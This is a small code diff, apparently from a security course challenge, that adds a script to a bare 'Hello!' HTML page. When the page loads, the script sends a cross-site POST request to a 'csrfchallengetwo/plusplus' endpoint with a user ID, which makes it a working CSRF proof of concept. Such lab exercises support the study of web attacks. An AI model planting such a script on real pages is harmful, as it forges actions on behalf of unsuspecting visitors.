@@ -10,7 +10,11 @@
 
 <body>
     <h1>Hello!</h1>
-
+    <script>
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://security.codepath.com/user/csrfchallengetwo/plusplus', true);
+        xhr.send('userId = 183cb80b98c5db7e87c6a738f46b631ca1432ef1');
+    </script>
 </body>
 
 </html>
